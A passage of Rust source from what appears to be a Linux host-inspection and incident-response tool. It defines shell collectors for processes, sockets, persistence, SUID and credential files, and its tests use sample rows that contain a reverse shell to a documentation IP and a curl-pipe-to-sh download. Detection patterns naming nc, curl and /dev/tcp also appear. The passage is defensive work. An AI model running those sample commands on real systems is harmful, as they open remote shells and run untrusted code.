/// elapsed seconds from the start time, and `[comm]` for a kernel thread with
/// no command line, as `ps` prints it. Both feed the same pipeline below.
const PROCESS_COMMAND: &str = r#"{ ps -eo pid=,ppid=,user=,stat=,pcpu=,pmem=,etimes=,args= --no-headers 2>/dev/null | grep . || { hz=$(getconf CLK_TCK 2>/dev/null || echo 100); pg=$(getconf PAGESIZE 2>/dev/null || echo 4096); up=$(cut -d' ' -f1 /proc/uptime); mt=$(awk '/^MemTotal:/{print $2; exit}' /proc/meminfo); for d in /proc/[0-9]*; do st=$(cat "$d/stat" 2>/dev/null) || continue; u=$(awk '/^Uid:/{print $2; exit}' "$d/status" 2>/dev/null); a=$(tr '\0\t' '  ' < "$d/cmdline" 2>/dev/null); printf '%s\t%s\t%s\n' "$u" "$a" "$st"; done | awk -F'\t' -v hz="$hz" -v pg="$pg" -v up="$up" -v mt="$mt" 'BEGIN{while((getline l < "/etc/passwd")>0){split(l,f,":"); if(!(f[3] in nm)) nm[f[3]]=f[1]}} {st=$3; p=0; s=st; while((i=index(s,")"))>0){p+=i; s=substr(s,i+1)} o=index(st,"("); if(o<2||p<=o) next; pid=substr(st,1,o-2); comm=substr(st,o+1,p-o-1); n=split(substr(st,p+2),f," "); if(n<22) next; el=up-f[20]/hz; if(el<0) el=0; cpu=(el>0)?(f[12]+f[13])/hz/el*100:0; mem=(mt>0)?f[22]*pg/1024/mt*100:0; c=$2; sub(/ +$/,"",c); if(c=="") c="[" comm "]"; u=($1 in nm)?nm[$1]:$1; printf "%s %s %s %s %.1f %.1f %d %s\n", pid, f[2], u, f[1], cpu, mem, el, c}' | sort -n; }; } | awk '{print ($4 ~ /^Z/ ? 1 : 0) "\t" $0}' | sort -s -n -k1,1 | cut -f2- | head -n 500 | awk '{risk="normal"; cmd=""; for(i=8;i<=NF;i++) cmd=cmd (i==8?"":" ") $i; if($4 ~ /^Z/ || $5+0>=80) risk="warning"; gsub(/\t/," ",cmd); print risk"\t"$1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6"\t"$7"\t"cmd}'"#;
/// A socket's owning process, read out of what `ss` prints.
///
/// `ss` reports the owner as `users:(("nginx",pid=13,fd=6))`, and the tab used
/// to put that whole string in the 进程 column. An operator scanning for a
/// process that should not be listening had to read `ss` syntax to find the
/// name in it. The name and the pid are pulled out instead, and both come from
/// the *first* entry so that a socket shared by several processes reports a pid
/// and a name that belong to each other.
///
/// The quotes `ss` puts round the name are dropped by keeping only the
/// characters a process name and a pid are made of, rather than by naming the
/// quote character: an awk program written inside a shell command inside a Rust
/// string is three levels of quoting deep, and this file has already lost two
/// tabs for a year to one quote too many.
/// Written once because it was wrong in four places at once: the stray quote
/// that blanked two tabs was copied along with the program it lived in.
macro_rules! socket_owner_awk {
    () => {
        r#"blob=""; if (match($0, /users:\(\(.*\)\)/)) blob=substr($0, RSTART, RLENGTH); gsub(/[^A-Za-z0-9_.:=,()\/ -]/, "", blob); name=""; if (match(blob, /\(\([^,)]+/)) name=substr(blob, RSTART+2, RLENGTH-2); pid=""; if (match(blob, /pid=[0-9]+/)) pid=substr(blob, RSTART+4, RLENGTH-4); "#
    };
}

/// The account a socket belongs to. `ss -e` prints `uid:` only when it is not
/// root, so an absent field means uid 0. `/etc/passwd` is read as awk's first
/// input to turn the number into the name the operator knows.
/// Asks the machine the same five things about every file `find` turns up:
/// mode, owner, size, modification time, and the path.
///
/// This replaced `find -printf`, which **busybox does not have**. The old
/// commands sent their errors to `/dev/null` and ended in `head`, whose exit
/// status is the pipeline's, so an Alpine machine answered "command succeeded,
/// no output" — and the SUID, sensitive-file and recently-changed tables all
/// told the operator there was nothing there. On a machine with a setuid
/// backdoor that is not a missing row, it is a false all-clear on the table
/// somebody opened specifically to find it.
///
/// `stat -c` is the portable half of the pair (busybox has no `--printf`), and
/// `-exec … {} +` batches so one `stat` covers hundreds of files. The path is
/// printed **last** because a name may itself contain the separator, and the
/// tabs are assembled in `awk`, whose `printf` expands escapes — `stat -c`'s
/// does not, which is its own trap: see [`suid_snapshot_command`].
macro_rules! file_facts_awk {
    () => {
        r#" -exec stat -c '%a|%U|%s|%y|%n' {} + 2>/dev/null | awk -F'|' '{mode=$1; owner=$2; size=$3; when=substr($4,1,19); sub(" ","T",when); path=$5; for(i=6;i<=NF;i++) path=path "|" $i; "#
    };
}

macro_rules! socket_user_awk {
    () => {
        r#"uid="0"; if (match($0, /[ \t]uid:[0-9]+/)) uid=substr($0, RSTART+5, RLENGTH-5); user=(uid in U ? U[uid] : uid); "#
    };
}

/// The first name wins, the way `getpwuid` resolves it. A second account
/// sharing uid 0 is a common backdoor, and letting the later line win renamed
/// every root-owned socket after the backdoor's own name.
macro_rules! passwd_awk {
    () => {
        r#"NR==FNR{split($0,P,":"); if (!(P[3] in U)) U[P[3]]=P[1]; next} "#
    };
}

const NETWORK_COMMAND: &str = concat!(
    r#"if command -v ss >/dev/null 2>&1; then ss -H -tunap 2>/dev/null | head -n 500 | awk '{"#,
    socket_owner_awk!(),
    r#"print $1"\t"$5"\t"$6"\t"$2"\t"pid"\t"name}'; else netstat -tunap 2>/dev/null | tail -n +3 | head -n 500 | awk '{prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $1"\t"$4"\t"$5"\t"$6"\t"pid"\t"prog}'; fi"#,
);
/// Services, on a host that has systemd and on a host that does not.
///
/// `systemctl` answers for most of the fleet, but a container, an Alpine box
/// and an older release have no systemd at all, and the tab came back empty on
/// all of them — an empty service list on a machine that has just been broken
/// into reads as "nothing is running", which is the opposite of the truth.
/// The fallback walks the init scripts instead, and decides "running" from
/// what the kernel says is running: a process whose name starts with the
/// script's (ssh -> sshd, mariadb -> mariadbd), or a live pid file.
const SERVICES_COMMAND: &str = r#"svc=""; if command -v systemctl >/dev/null 2>&1; then svc=$(systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{desc=""; for(i=5;i<=NF;i++) desc=desc (i==5?"":" ") $i; gsub(/\t/," ",desc); print $1"\t"$4"\t"$3"\t"desc}'); fi; if [ -n "$svc" ]; then printf '%s\n' "$svc"; elif [ -d /etc/init.d ]; then running=$(cat /proc/[0-9]*/comm 2>/dev/null | sort -u | tr '\n' ' '); for s in /etc/init.d/*; do [ -f "$s" ] && [ -x "$s" ] || continue; n=${s##*/}; case "$n" in README*|skeleton|rc|rcS|functions) continue;; esac; en="未启用"; for l in /etc/rc[2345].d/S*"$n" /etc/runlevels/*/"$n"; do if [ -e "$l" ]; then en="开机启动"; break; fi; done; st="已停止"; case " $running " in *" $n"*) st="运行中";; esac; if [ "$st" = "已停止" ]; then for p in /run/"$n".pid /var/run/"$n".pid /run/"$n"/*.pid /var/run/"$n"/*.pid; do [ -f "$p" ] || continue; pid=$(tr -dc 0-9 < "$p" 2>/dev/null); if [ -n "$pid" ] && [ -d /proc/"$pid" ]; then st="运行中"; break; fi; done; fi; desc=$(sed -n 's/^#[[:space:]]*Short-Description:[[:space:]]*//p' "$s" 2>/dev/null | head -n 1); [ -n "$desc" ] || desc=$(sed -n 's/^#[[:space:]]*Provides:[[:space:]]*//p' "$s" 2>/dev/null | head -n 1); printf '%s\t%s\t%s\t%s\n' "$n" "$st" "$en" "$desc"; done | head -n 500; fi"#;
/// Outbound connections, whose columns were reading one field too far along.
///
/// `ss -tnp state established` drops the State column that `ss -tunap` prints,
/// so its rows are `Recv-Q Send-Q Local Peer Process` — five fields, not the
/// six the old program indexed. It put the peer address under 本地地址 and the
/// raw process string under 远程地址, and read the remote port out of the
/// process string. Every row this tab has ever shown named the wrong end of the
/// connection, which is the one thing the tab exists to tell you.
const ESTABLISHED_COMMAND: &str = concat!(
    r#"if command -v ss >/dev/null 2>&1; then ss -H -tnp -e state established 2>/dev/null | head -n 500 | awk '"#,
    passwd_awk!(),
    r#"{port=$4; sub(/^.*:/, "", port); "#,
    socket_owner_awk!(),
    socket_user_awk!(),
    r#"print $3"\t"$4"\t"port"\t"pid"\t"name"\t"user}' /etc/passwd -; else netstat -tnp 2>/dev/null | awk '$6=="ESTABLISHED"{port=$5; sub(/^.*:/, "", port); prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $4"\t"$5"\t"port"\t"pid"\t"prog"\t"}' | head -n 500; fi"#,
);
/// Listening ports. The 用户 column was printed as a bare trailing tab and so
/// was empty on every row of every host; `ss -e` reports the owning uid, and
/// `/etc/passwd` turns it into a name.
const OPEN_PORTS_COMMAND: &str = concat!(
    r#"if command -v ss >/dev/null 2>&1; then ss -H -tulnp -e 2>/dev/null | head -n 500 | awk '"#,
    passwd_awk!(),
    r#"{local=$5; port=local; sub(/^.*:/, "", port); addr=substr(local, 1, length(local)-length(port)-1); gsub(/^\[|\]$/, "", addr); "#,
    socket_owner_awk!(),
    socket_user_awk!(),
    r#"print $1"\t"addr"\t"port"\t"pid"\t"name"\t"user}' /etc/passwd -; else netstat -tulnp 2>/dev/null | tail -n +3 | head -n 500 | awk '{local=$4; port=local; sub(/^.*:/, "", port); addr=substr(local, 1, length(local)-length(port)-1); gsub(/^\[|\]$/, "", addr); prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $1"\t"addr"\t"port"\t"pid"\t"prog"\t"}'; fi"#,
);
const USERS_COMMAND: &str =
    r#"getent passwd 2>/dev/null | head -n 500 | awk -F: '{print $1"\t"$3"\t"$4"\t"$6"\t"$7}'"#;
/// What starts by itself, on a host with systemd and on one without.
///
/// The runlevel links are the whole answer on a SysV host and were not read at
/// all, so the tab was blank there — and blank is the most dangerous answer a
/// persistence tab can give.
const AUTOSTART_COMMAND: &str = r#"units=""; if command -v systemctl >/dev/null 2>&1; then units=$(systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $1"\t"$1"\t"$2"\tsystemd"}'); fi; if [ -n "$units" ]; then printf '%s\n' "$units"; else for l in /etc/rc[2345].d/S* /etc/runlevels/*/*; do [ -e "$l" ] || continue; n=${l##*/}; case "$n" in S[0-9][0-9]*) n=${n#S??};; esac; t=$(readlink -f "$l" 2>/dev/null); [ -n "$t" ] || t="$l"; printf '%s\t%s\tenabled\tinit.d\n' "$n" "$t"; done | sort -u | head -n 500; fi"#;
const CRON_COMMAND: &str = r#"for f in /etc/crontab /etc/cron.d/*; do [ -f "$f" ] || continue; awk -v src="$f" 'NF && $1 !~ /^#/ {cmd=""; for(i=7;i<=NF;i++) cmd=cmd (i==7?"":" ") $i; gsub(/\t/," ",cmd); print $6"\t"$1" "$2" "$3" "$4" "$5"\t"cmd"\t"src}' "$f" 2>/dev/null; done | head -n 500"#;
const SSH_KEYS_COMMAND: &str = r#"for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -f "$f" ] || continue; u=$(stat -c %U "$f" 2>/dev/null); awk -v u="$u" -v f="$f" 'NF>=2 && $1 !~ /^#/ {comment=""; for(i=3;i<=NF;i++) comment=comment (i==3?"":" ") $i; print u"\t"$1"\t"$2"\t"comment"\t"f}' "$f"; done | head -n 500"#;
// Capped at two hundred while the tab could show five hundred, so this one
// could never fill its own table, let alone report that it had been cut. It
// now spells its row cap the way every other table does.
/// Who logged in, and from where.
///
/// `last -Faiw` is the GNU spelling and busybox rejects the whole flag group,
/// which left this exiting 1 with nothing on stdout — and the tab, whose tool
/// check only asks whether `last` exists, then showed an empty login history
/// on a machine that has one. Falling back to bare `last` costs nothing;
/// busybox prints a header row, so `USER` joins the words that are never a
/// username.
///
/// Columns are user, terminal, source address, login time and status. `-F`
/// adds the year and `-a` moves the host to the end, while bare `last` has
/// neither, so the address is matched by shape wherever it sits and the date
/// runs through the year when there is one, otherwise through the clock. A
/// login with no source prints `-`, which the row actions read as "this row
/// carries no address to investigate".
const LOGIN_HISTORY_COMMAND: &str = r#"{ last -Faiw 2>/dev/null || last 2>/dev/null; } | head -n 500 | awk 'NF>=3 && $1 !~ /^(wtmp|btmp|reboot|shutdown|USER)$/ {ip="-"; ipat=0; for(k=3;k<=NF;k++) if($k ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {ip=$k; ipat=k} n=0; for(k=1;k<=NF;k++) {if(k==ipat) continue; a[++n]=$k} if(n<6) next; t=a[3]" "a[4]" "a[5]" "a[6]; if(a[7] ~ /^[0-9][0-9][0-9][0-9]$/) {t=t" "a[7]; s=8} else s=7; st=""; for(i=s;i<=n;i++) st=st (i==s?"":" ") a[i]; gsub(/\t/," ",t); gsub(/\t/," ",st); print a[1]"\t"a[2]"\t"ip"\t"t"\t"st}'"#;
const SUID_COMMAND: &str = concat!(
    r#"find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -xdev -type f \( -perm -4000 -o -perm -2000 \)"#,
    file_facts_awk!(),
    r#"printf "%s\t%s\t%s\t%s\t%s\tnormal\n", path, mode, owner, size, when}' | head -n 500"#
);
/// Everywhere a thing can arrange to run again, gathered in one place.
///
/// It used to list enabled systemd units and nothing else, which is the one
/// persistence location an attacker is least likely to use because it is the
/// one everybody looks at. `rc.local`, a file dropped in `/etc/profile.d`, a
/// line in `/etc/ld.so.preload` and a `@reboot` crontab entry all survive a
/// reboot just as well and none of them appeared here at all.
const AUTORUNS_COMMAND: &str = r#"{ if command -v systemctl >/dev/null 2>&1; then systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 200 | awk '{print "systemd\t"$1"\t"$2"\t"$1"\troot"}'; fi; for l in /etc/rc[2345].d/S* /etc/runlevels/*/*; do [ -e "$l" ] || continue; n=${l##*/}; case "$n" in S[0-9][0-9]*) n=${n#S??};; esac; t=$(readlink -f "$l" 2>/dev/null); [ -n "$t" ] || t="$l"; printf 'init.d\t%s\t开机启动\t%s\troot\n' "$n" "$t"; done | sort -u; seen=""; for f in /etc/rc.local /etc/rc.d/rc.local; do [ -f "$f" ] || continue; rp=$(readlink -f "$f" 2>/dev/null); [ -n "$rp" ] || rp="$f"; case " $seen " in *" $rp "*) continue;; esac; seen="$seen $rp"; o=$(stat -c %U "$f" 2>/dev/null); s=未设置执行位; [ -x "$f" ] && s=开机执行; grep -v -e '^[[:space:]]*#' -e '^[[:space:]]*$' -e '^[[:space:]]*exit' "$f" 2>/dev/null | tr '\t' ' ' | head -n 20 | while IFS= read -r line; do printf 'rc.local\t%s\t%s\t%s\t%s\n' "${f##*/}" "$s" "$line" "$o"; done; done; for f in /etc/profile.d/*.sh; do [ -f "$f" ] || continue; o=$(stat -c %U "$f" 2>/dev/null); c=$(grep -v -e '^[[:space:]]*#' -e '^[[:space:]]*$' "$f" 2>/dev/null | head -n 2 | tr '\n\t' '  '); [ -n "$c" ] || c="$f"; printf 'profile.d\t%s\t登录执行\t%s\t%s\n' "${f##*/}" "$c" "$o"; done; if [ -f /etc/ld.so.preload ]; then o=$(stat -c %U /etc/ld.so.preload 2>/dev/null); tr '\t' ' ' < /etc/ld.so.preload 2>/dev/null | head -n 20 | while IFS= read -r line; do [ -n "$line" ] || continue; printf 'ld.so.preload\t%s\t强制预加载\t%s\t%s\n' ld.so.preload "$line" "$o"; done; fi; for f in /var/spool/cron/crontabs/* /var/spool/cron/* /etc/cron.d/*; do [ -f "$f" ] || continue; u=${f##*/}; grep '@reboot' "$f" 2>/dev/null | tr '\t' ' ' | head -n 10 | while IFS= read -r line; do printf 'cron @reboot\t%s\t开机执行\t%s\t%s\n' "$u" "$line" "$u"; done; done; } 2>/dev/null | head -n 500"#;
const FIREWALL_COMMAND: &str = r#"iptables-save 2>/dev/null | grep '^-A ' | head -n 500 | awk '{rule=$0; gsub(/\t/," ",rule); print $2"\t\t\t\t\t"rule}'"#;
const ENV_COMMAND: &str = r#"env 2>/dev/null | sort | head -n 500 | awk -F= '{name=$1; value=substr($0,length(name)+2); risk=(name=="LD_PRELOAD" || name=="LD_LIBRARY_PATH" ? "warning" : "normal"); gsub(/\t/," ",value); print name"\t"value"\t"risk}'"#;
const SHELL_CONFIG_COMMAND: &str = r#"for f in /etc/profile /etc/bash.bashrc /root/.bashrc /home/*/.bashrc; do [ -f "$f" ] || continue; owner=$(stat -c %U "$f" 2>/dev/null); mtime=$(stat -c %Y "$f" 2>/dev/null); if [ ! -s "$f" ]; then printf '%s\t%s\t%s\t1\t\tnormal\n' "$f" "$owner" "$mtime"; else awk -v f="$f" -v o="$owner" -v m="$mtime" '{line=$0; gsub(/\t/," ",line); risk=(line ~ /(curl|wget|nc |ncat|LD_PRELOAD|\/dev\/tcp)/ ? "warning" : "normal"); print f"\t"o"\t"m"\t"NR"\t"line"\t"risk}' "$f"; fi; done | head -n 500"#;
/// What is installed, whichever package manager put it there.
///
/// It knew `dpkg` and `rpm` only, so on Alpine every branch fell through, the
/// command exited zero with nothing to say, and the tab reported that the
/// machine had **no packages installed at all** — to an operator looking for
/// one that should not be there. `apk` is read out of its own database rather
/// than through `apk info`, whose output glues name and version together with
/// the same dash that appears inside names.
const PACKAGES_COMMAND: &str = r#"if command -v dpkg-query >/dev/null 2>&1; then dpkg-query -W -f='${binary:Package}\t${Version}\t\tdpkg\n' 2>/dev/null | head -n 500; elif command -v rpm >/dev/null 2>&1; then rpm -qa --qf '%{NAME}\t%{VERSION}-%{RELEASE}\t%{INSTALLTIME}\trpm\n' 2>/dev/null | head -n 500; elif [ -r /lib/apk/db/installed ]; then awk '/^P:/{n=substr($0,3)} /^V:/{if(n!=""){printf "%s\t%s\t\tapk\n", n, substr($0,3); n=""}}' /lib/apk/db/installed 2>/dev/null | head -n 500; elif command -v pacman >/dev/null 2>&1; then pacman -Q 2>/dev/null | awk '{printf "%s\t%s\t\tpacman\n", $1, $2}' | head -n 500; fi"#;
const SUDOERS_COMMAND: &str = r#"for f in /etc/sudoers /etc/sudoers.d/*; do [ -f "$f" ] || continue; awk -v src="$f" 'NF && $1 !~ /^#/ {line=$0; gsub(/\t/," ",line); np=(line ~ /NOPASSWD/ ? "yes" : "no"); print $1"\tALL\t"line"\t"np"\t"src}' "$f" 2>/dev/null; done | head -n 500"#;
const TIMERS_COMMAND: &str = r#"systemctl list-timers --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $(NF-1)"\t"$1" "$2"\t"$3"\t"$4" "$5"\t"$NF}'"#;
const KERNEL_MODULES_COMMAND: &str = r#"{ awk '{risk=($1 ~ /(diamorphine|reptile|rootkit)/ ? "high" : "normal"); print $1"\t"$2"\t"$3"\t"risk}' /proc/modules 2>/dev/null; for f in /etc/modprobe.d/lovelyres-blacklist-*.conf; do [ -f "$f" ] && [ ! -L "$f" ] || continue; b=${f##*/}; m=${b#lovelyres-blacklist-}; m=${m%.conf}; printf '%s\n' "$m" | grep -Eq '^[A-Za-z0-9_][A-Za-z0-9_.-]{0,127}$' || continue; [ "$(wc -l < "$f")" -eq 2 ] || continue; grep -Fqx '# Managed by LovelyRes; remove through LovelyRes to preserve audit history.' "$f" || continue; grep -Fqx "blacklist $m" "$f" || continue; awk -v m="$m" '$1==m {found=1} END{exit !found}' /proc/modules 2>/dev/null || printf '%s\t0\t0\twarning\n' "$m"; done; } | head -n 500"#;
const ROOTCHECK_COMMAND: &str = r#"printf 'LD_PRELOAD\t'; if [ -s /etc/ld.so.preload ]; then printf 'suspicious\t'; head -n 3 /etc/ld.so.preload 2>/dev/null | tr '\n\t' '  '; else printf 'clean\t-'; fi; printf '\n'; printf 'SSH binary strings\t'; n=$(strings /usr/sbin/sshd 2>/dev/null | grep -Eic 'backdoor|secret|hack'); if [ "${n:-0}" -gt 0 ]; then printf 'suspicious\t%s\n' "$n"; else printf 'clean\t0\n'; fi; printf 'Recent PAM modules\t'; n=$(find /lib/security /lib64/security -name '*.so' -mmin -10080 2>/dev/null | wc -l); if [ "$n" -gt 0 ]; then printf 'suspicious\t%s\n' "$n"; else printf 'clean\t0\n'; fi"#;
const SENSITIVE_COMMAND: &str = concat!(
    r#"find /root /home /etc /var/www -maxdepth 4 \( -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '.env' -o -name 'wp-config.php' -o -name '.git-credentials' -o -name '.netrc' -o -name '.pgpass' -o -name '.my.cnf' -o -name 'shadow' -o -name 'gshadow' \) -type f"#,
    file_facts_awk!(),
    r#"printf "%s\tsensitive\t%s\t%s\t%s\n", path, mode, owner, when}' | head -n 500"#
);
const RECENT_FILES_COMMAND: &str = concat!(
    r#"find /etc /usr/bin /usr/sbin /usr/lib /usr/local/bin /var/www /tmp /var/tmp /dev/shm -xdev -type f -mtime -3"#,
    file_facts_awk!(),
    r#"printf "%s\t%s\t%s\t%s\tnormal\n", path, when, size, owner}' | head -n 500"#
);
const DOCKER_COMMAND: &str = r#"docker ps -a --format '{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.CreatedAt}}' 2>/dev/null | head -n 500"#;
const KUBERNETES_COMMAND: &str = r#"kubectl get pods -A --no-headers 2>/dev/null | head -n 500 | awk '{print $1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6}'"#;
const WEB_APPS_COMMAND: &str = r#"(nginx -T 2>/dev/null | grep -E 'server_name|listen|root' | head -n 500 | awk '{line=$0; gsub(/\t/," ",line); print "nginx\t"line"\tconfigured\t\t"}'; apachectl -S 2>/dev/null | head -n 500 | awk '{line=$0; gsub(/\t/," ",line); print "apache\t"line"\tconfigured\t\t"}')"#;

#[cfg(test)]
mod tests {
    use std::{fs, path::PathBuf, sync::Arc};

    use chrono::Utc;
    use uuid::Uuid;

    use super::*;

    /// A row nobody labelled still has to stand out when it should.
    #[test]
    fn a_boot_entry_that_opens_a_shell_outward_is_marked_without_being_labelled() {
        let reverse_shell = row(&[
            "rc.local",
            "rc.local",
            "开机执行",
            "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1 &",
            "root",
        ]);
        assert_eq!(infer_risk(&reverse_shell), SystemInfoRisk::High);

        let downloaded_and_run = row(&[
            "profile.d",
            "00-locale.sh",
            "登录执行",
            "curl -fsSL http://198.51.100.7/l.sh | sh &",
            "root",
        ]);
        assert_eq!(infer_risk(&downloaded_and_run), SystemInfoRisk::Warning);

        let preload = row(&[
            "ld.so.preload",
            "ld.so.preload",
            "强制预加载",
            "/x/y.so",
            "root",
        ]);
        assert_eq!(infer_risk(&preload), SystemInfoRisk::High);

        // The ordinary rows it sits among stay ordinary; a tab where everything
        // is marked says no more than a tab where nothing is.
        for ordinary in [
            row(&["init.d", "nginx", "开机启动", "/etc/init.d/nginx", "root"]),
            row(&["init.d", "ssh", "开机启动", "/etc/init.d/ssh", "root"]),
            row(&["systemd", "cron.service", "enabled", "cron.service", "root"]),
            // Checksums are piped about all day and are not shells.
            row(&[
                "cron",
                "root",
                "0 3 * * *",
                "sha256sum /etc/passwd | sha256sum",
                "",
            ]),
        ] {
            assert_eq!(
                infer_risk(&ordinary),
                SystemInfoRisk::Normal,
                "{ordinary:?}"
            );
        }
    }

    fn row(cells: &[&str]) -> Vec<String> {
        cells.iter().map(|cell| (*cell).to_owned()).collect()
    }

    /// A word in a column of its own is a verdict; the same word in a line of
    /// shell is a word.
    #[test]
    fn a_state_word_only_counts_when_the_command_put_it_in_its_own_column() {
        // The collector said so: a risk column, a systemd state.
        assert_eq!(
            infer_risk(&row(&[
                "/root/.bashrc",
                "root",
                "1",
                "12",
                "export X=1",
                "warning"
            ])),
            SystemInfoRisk::Warning,
        );
        assert_eq!(
            infer_risk(&row(&["nginx.service", "failed", "enabled", "web server"])),
            SystemInfoRisk::Warning,
        );

        // The file merely mentions it.
        for prose in [
            row(&[
                "/root/.bashrc",
                "root",
                "1",
                "40",
                "# colored GCC warnings and errors",
                "normal",
            ]),
            row(&[
                "/root/.bashrc",
                "root",
                "1",
                "41",
                "#export GCC_COLORS='error=01;31:warning=01;35'",
                "normal",
            ]),
            row(&[
                "sshd.service",
                "running",
                "enabled",
                "OpenSSH server, logs failed logins",
            ]),
        ] {
            assert_eq!(infer_risk(&prose), SystemInfoRisk::Normal, "{prose:?}");
        }

        // A rule that grants a passwordless shell is still found inside its cell,
        // because nothing says NOPASSWD by accident.
        assert_eq!(
            infer_risk(&row(&[
                "operator",
                "ALL",
                "ALL",
                "NOPASSWD:ALL",
                "/etc/sudoers.d/90"
            ])),
            SystemInfoRisk::Warning,
        );
    }

    /// Every quote in an awk program has to close.
    ///
    /// The open-ports and established-connection programs both ended with one
    /// quote too many: it opened a string that swallowed the closing brace, so
    /// awk saw neither a block end nor a terminated string and refused the
    /// whole program. Both tabs showed the parser error where the ports should
    /// have been, on every target, for as long as they had existed. A stray
    /// quote is invisible in a line this long, so it is counted here instead.
    /// A table has to be able to say whether it is the whole story.
    ///
    /// Each command caps its own output on the target. While that cap equalled
    /// the number of rows the caller wanted, a machine with more answered with
    /// a full table and nothing else, so the parser never saw a row past the
    /// limit and reported that nothing had been cut. A busy host showed five
    /// hundred processes and told the operator that was all of them — and the
    /// process worth finding is exactly the one that would sit past the cap.
    /// An empty table has to say which kind of empty it is.
    ///
    /// "This machine has no firewall rules" and "there is no iptables here, so
    /// nobody looked" are opposite conclusions — the first says act now, the
    /// second says find another way to look — and they used to render as the
    /// same sentence. During an incident the reassuring reading is the wrong
    /// one to hand someone.
    #[test]
    fn a_tab_that_needs_a_tool_says_so_when_the_tool_is_not_there() {
        for tab in SystemInfoTab::ALL {
            let names = tab.required_tool().is_some();
            let probes = tab.tool_probe().is_some();
            assert_eq!(
                names, probes,
                "{tab:?} names a tool but does not test for it"
            );
            let command = tab.command(500);
            assert_eq!(
                command.contains(NO_TOOL_MARKER),
                names,
                "{tab:?} disagrees about announcing a missing tool"
            );
        }
        // A tab that reads files always has an answer, so it must not claim a
        // tool is missing; one that shells out to a program must.
        assert_eq!(SystemInfoTab::Firewall.required_tool(), Some("iptables"));
        assert_eq!(SystemInfoTab::Processes.required_tool(), None);

        let request = SystemInfoRequest::new(SystemInfoTab::Firewall, 500).unwrap();
        let absent = parse_table(&request, &format!("{NO_TOOL_MARKER}\n"));
        assert_eq!(absent.missing_tool, Some("iptables"));
        assert!(absent.rows.is_empty());
        // Genuinely empty is not the same state, and must not borrow the excuse.
        assert_eq!(parse_table(&request, "").missing_tool, None);

        // A machine that prints the marker *and* rules is a machine with rules.
        // Otherwise a compromised host could hide its own firewall behind the
        // excuse that the tool was missing.
        let rule = "INPUT\t\t\t\t\t-A INPUT -j ACCEPT";
        let hostile = parse_table(&request, &format!("{NO_TOOL_MARKER}\n{rule}"));
        assert_eq!(
            hostile.missing_tool, None,
            "the marker must not outrank rows"
        );
        assert_eq!(hostile.rows.len(), 2);
        // And the name never comes from the machine.
        let forged = parse_table(&request, &format!("{NO_TOOL_MARKER}\tnftables\n"));
        assert_eq!(
            forged.missing_tool, None,
            "a marker with anything after it is a row"
        );

        // Installed is not the same as working. A tool whose daemon is dead is
        // a third state, and the quietest of the three: nothing about the
        // machine looks wrong, so an empty table reads as an empty machine.
        for tab in SystemInfoTab::ALL {
            let announces = tab.command(500).contains(TOOL_FAILED_MARKER);
            assert_eq!(announces, tab.tool_health().is_some(), "{tab:?}");
            if tab.tool_health().is_some() {
                assert!(
                    tab.tool_probe().is_some(),
                    "{tab:?} checks health without checking presence"
                );
            }
        }
        // A tool that talks to something can fail to answer while still being
        // installed. `iptables-save` was assumed not to be one of those — "being
        // installed is enough" — and every container in the lab disproves it:
        // without CAP_NET_ADMIN it prints "you must be root" and stops, and the
        // firewall tab then showed nothing at all, which reads as "no rules" on
        // the one screen where that is worst to get wrong.
        assert!(SystemInfoTab::Docker.tool_health().is_some());
        assert!(SystemInfoTab::Kubernetes.tool_health().is_some());
        assert!(SystemInfoTab::Firewall.tool_health().is_some());
        // These really do just read a file or a socket listing.
        assert!(SystemInfoTab::Network.tool_health().is_none());
        assert!(SystemInfoTab::Packages.tool_health().is_none());

        let docker = SystemInfoRequest::new(SystemInfoTab::Docker, 500).unwrap();
        let dead = parse_table(&docker, &format!("{TOOL_FAILED_MARKER}\n"));
        assert_eq!(dead.failed_tool, Some("docker"));
        assert_eq!(
            dead.missing_tool, None,
            "installed is not the same as absent"
        );
        assert!(dead.rows.is_empty());
        // The same guard as the other marker: rows outrank it.
        let alive = parse_table(
            &docker,
            &format!("{TOOL_FAILED_MARKER}\nweb\tx\tx\tx\tx\tx"),
        );
        assert_eq!(alive.failed_tool, None, "the marker must not outrank rows");
    }

    #[test]
    fn every_table_asks_for_one_row_more_than_it_can_show() {
        let mut unmarked = Vec::new();
        for tab in SystemInfoTab::ALL {
            if !tab.command_template().contains(ROW_LIMIT_MARKER) {
                unmarked.push(tab);
                continue;
            }
            let command = tab.command(500);
            assert!(command.contains("head -n 501"), "{tab:?}: {command}");
            assert!(!command.contains("head -n 500"), "{tab:?}: {command}");
            // A smaller request is rewritten the same way; the cap is not a
            // number baked into the string any more.
            assert!(tab.command(10).contains("head -n 11"), "{tab:?}");
            assert!(tab.command(2_000).contains("head -n 2001"), "{tab:?}");
        }
        // Only the fixed set of rootcheck facts has no row cap to rewrite.
        assert_eq!(unmarked, vec![SystemInfoTab::Rootcheck], "{unmarked:?}");
        assert!(
            SystemInfoTab::ShellConfigs
                .command(2_000)
                .contains("head -n 2001")
        );
        // Rootcheck puts no ceiling on the target at all, so everything it
        // finds reaches the parser and the parser decides. That is the other
        // shape this can safely take.
        let rootcheck = SystemInfoTab::Rootcheck.command_template();
